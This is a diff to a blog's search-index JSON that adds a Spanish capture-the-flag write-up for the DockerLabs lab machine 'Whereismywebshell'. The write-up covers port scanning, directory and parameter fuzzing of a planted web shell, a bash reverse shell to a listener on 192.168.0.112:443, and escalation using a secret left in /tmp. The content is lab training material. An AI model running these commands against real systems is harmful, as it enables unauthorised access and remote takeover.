@@ -1,6 +1,23 @@
 [
   
   {
+    "title": "Whereismywebshell , DockerLabs",
+    "url": "/posts/whereismywebshell/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-30 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nma...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nmap  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX whereisReporte nmapRevisamos la web a ver que encontramos es una web de una academia mientras le miramos el codigo lanzamos gobuster.Vamos directos a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690La salida nos arroja varios archivos prometedores ,el warning y lo que be ser una webshell.Primero miro el warning por si nos dijera algo , no arroja luz de ningun tipo asi que caragmos shell php y vemos una pagina en blanco, en este punto vamos a fuzzear la palabra que nos falta para poder ejecutar comandos remotos.Asi que vamos a fuzzear con wffuz.wfuzz -c --hl=0 -t 200 -w /usr/share/dict/wordlist-probable.txt -u \"http://172.17.0.2/shell.php?FUZZ=id\"Una vez obtenido el parametro pasamos a probar si podemos ejecutar comandos.Resultado positivo , mandemos una rev shell.Ejecutamos lo siguiente pero primero nectact a la escucha.sudo nc -lvnp 443En la webshellbash -c \"bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\"RecepcionEscaladaLo primero una vez reciba la revshell le aplicamos tratamiento.script /dev/null -c bashLa mandamos al background con control-Z.export TERM=xtermexport SHELL=bashSi queremos ajustarla al maximo debemos indicarle el numero de lineas y columnas de nuestra terminal .  Para ver el numero de line y columms de nuestra term ejecutamos respectivamente  echo $LINES y echo $COLUMMS  Ya configurada empezamos a mirar con sudo -l y find.Ninguno nos devuelve nada y ahi recorde que hemos de acostumbrarnos a mirar hacia atras y recordar todo lo que mos hemos ido encontando en la maquina.La memoria me decia que guardaba un secreto en /tmp/ , asi que vamos a mirar que nos dejaron.cd /tmp/ls -laLa puso facil esta vez.su Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
+  },
+  
+  {
     "title": "Summervibes , DockerLabs",
     "url": "/posts/summervibes/",
     "categories": "DockerLabs",
